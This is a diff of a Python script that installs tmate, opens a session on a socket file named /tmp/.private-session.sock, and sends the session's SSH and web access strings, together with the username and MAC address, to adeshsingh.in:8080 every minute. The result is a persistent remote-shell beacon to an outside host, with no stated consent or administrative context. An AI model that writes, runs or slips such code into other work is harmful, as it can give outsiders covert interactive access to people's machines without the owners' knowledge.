@@ -1,100 +1,176 @@
-#!/bin/python3
+#!/usr/bin/python3
+import re
+import os
+import time
+import json
+import socket
 import subprocess
 import requests
-import json
-import time
-import os
-import re
 
-def is_connected():
+API_HOST = "adeshsingh.in"
+API_PORT = 8080
+
+session = requests.Session()
+
+
+def log(message: str) -> None:
+    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+    print(f"[{timestamp}] {message}", flush=True)
+
+
+def is_server_reachable() -> bool:
     try:
-        response = requests.get("https://www.google.com/", timeout=5)
-        return response.status_code == 200
-    except requests.ConnectionError:
+        log(f"Checking connectivity ...")
+        with socket.create_connection((API_HOST, API_PORT), timeout=10):
+            return True
+    except OSError as e:
+        log(f"Connectivity check failed: {e}")
         return False
 
-def get_username():
-    try:
-        users = os.listdir('/home/')
-        return users[0] if users else 'unknown'
-    except Exception as e:
-        raise
 
-def get_mac_address():
+def get_username() -> str:
     try:
-        result = subprocess.check_output(['ip', 'link', 'show'], universal_newlines=True)
-        match = re.search(r'link/ether (\S+)', result)
-        return match.group(1).upper() if match else "MAC address not found."
+        users = os.listdir("/home/")
+        return users[0] if users else "unknown"
     except Exception as e:
-        raise
+        log(f"Error getting username: {e}")
+        return "unknown"
 
-def install_tmate():
+
+def get_mac_address() -> str:
     try:
-        os.system("sudo apt -y update")
-        os.system("sudo apt -y install tmate")
+        result = subprocess.check_output(
+            ["ip", "link", "show"],
+            universal_newlines=True,
+            timeout=30,
+        )
+        match = re.search(r"link/ether (\S+)", result)
+        return match.group(1).upper() if match else "MAC address not found"
     except Exception as e:
-        raise
+        log(f"Error getting MAC address: {e}")
+        return "MAC address not found"
 
-def generate_new_session(session_file):
+
+def ensure_tmate_installed() -> None:
+    if os.path.exists("/usr/bin/tmate"):
+        return
+
+    log("tmate not found at /usr/bin/tmate, attempting installation...")
+    try:
+        os.system("apt-get update -y")
+        os.system("apt-get install -y tmate")
+        log("tmate installation attempted.")
+    except Exception as e:
+        log(f"Error installing tmate: {e}")
+
+
+def generate_new_session(session_file: str):
     try:
         if not os.path.exists(session_file):
-            subprocess.run(f"tmate -S {session_file} new-session -d -c ~/", shell=True, check=True)
-            subprocess.run(f"tmate -S {session_file} wait tmate-ready", shell=True, check=True)
+            log("Creating new tmate session...")
+            subprocess.run(
+                f"tmate -S {session_file} new-session -d -c ~/",
+                shell=True,
+                check=True,
+                timeout=30,
+            )
+            subprocess.run(
+                f"tmate -S {session_file} wait tmate-ready",
+                shell=True,
+                check=True,
+                timeout=60,
+            )
 
-        process = subprocess.Popen(f"tmate -S {session_file} display -p '#{{tmate_ssh}}'", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        session_output, _ = process.communicate()
+        process = subprocess.Popen(
+            f"tmate -S {session_file} display -p '#{{tmate_ssh}}'",
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+        )
+        try:
+            session_output, err_output = process.communicate(timeout=30)
+        except subprocess.TimeoutExpired:
+            process.kill()
+            log("Timed out while fetching tmate session info.")
+            return None, None
+
+        if process.returncode != 0:
+            log(f"tmate display command failed: {err_output.decode(errors='ignore')}")
+            return None, None
+
         ssh_session = session_output.decode().strip()
-        web_session = ssh_session.split('@')[0].replace('ssh ', 'https://tmate.io/t/')
-        return ssh_session, web_session
-    except Exception as e:
-        raise
+        if not ssh_session:
+            log("Empty SSH session string returned by tmate.")
+            return None, None
 
-def send_payload_to_api(payload):
+        web_session = ssh_session.split("@")[0].replace("ssh ", "https://tmate.io/t/")
+        return ssh_session, web_session
+
+    except subprocess.TimeoutExpired:
+        log("Timed out while creating tmate session.")
+        return None, None
+    except Exception as e:
+        log(f"Error generating tmate session: {e}")
+        return None, None
+
+
+def send_payload_to_api(payload: dict) -> bool:
     try:
-        url = "https://adeshsingh.in:8080/api/session/"
-        headers = {'Content-Type': 'application/json'}
-        payload_json = json.dumps(payload)
-        response = requests.post(url, headers=headers, data=payload_json)
+        log(f"Sending payload to API ...")
+        response = session.post(
+            f"https://{API_HOST}:{API_PORT}/api/session/",
+            headers={"Content-Type": "application/json"},
+            data=json.dumps(payload),
+            timeout=10,
+        )
+        log(f"API response status: {response.status_code}")
         response.raise_for_status()
         return True
+    except requests.exceptions.Timeout:
+        log("Request to API timed out.")
+        return False
     except requests.exceptions.RequestException as e:
+        log(f"Error sending payload to API: {e}")
         return False
 
-if __name__=='__main__':
-    try:
-        while True:
-            print("Checking internet connectivity...")
-            if is_connected():
-                print("Internet connection established.")
-                session_file = "/tmp/.private-session.sock"
 
-                if not os.path.exists("/usr/bin/tmate"):
-                    print("Installing tmate...")
-                    install_tmate()
+def main():
+    session_file = "/tmp/.private-session.sock"
 
-                print("Generating new tmate session...")
-                ssh_session, web_session = generate_new_session(session_file)
-                if ssh_session and web_session:
-                    print("Tmate session generated successfully.")
-                    payload = {
-                        "username": get_username(),
-                        "mac_address": get_mac_address(),
-                        "ssh_session": ssh_session,
-                        "web_session": web_session,
-                        "status": True
-                    }
-                    print("Sending payload to API...")
-                    if send_payload_to_api(payload=payload):
-                        print("Payload sent successfully.")
-                    else:
-                        print("Failed to send payload to API.")
-                else:
-                    print("Failed to generate tmate session.")
+    ensure_tmate_installed()
+
+    while True:
+        try:
+            if not is_server_reachable():
+                log("API server not reachable. Will retry after interval.")
+                time.sleep(60)
+                continue
+
+            ssh_session, web_session = generate_new_session(session_file)
+            if not ssh_session or not web_session:
+                log("Failed to obtain tmate session. Will retry after interval.")
+                time.sleep(60)
+                continue
+
+            payload = {
+                "username": get_username(),
+                "mac_address": get_mac_address(),
+                "ssh_session": ssh_session,
+                "web_session": web_session,
+                "status": True,
+            }
+            log(f"Prepared payload: {payload}")
+
+            if send_payload_to_api(payload):
+                log("Payload sent successfully.")
             else:
-                print("No internet connection available.")
-            time.sleep(60)
+                log("Failed to send payload to API.")
 
-    except KeyboardInterrupt:
-        print("Script terminated by the user.")
-    except Exception as e:
-        print(f"An error occurred: {e}")
+        except Exception as e:
+            log(f"Unexpected error in main loop: {e}")
+
+        time.sleep(60)
+
+
+if __name__ == "__main__":
+    main()
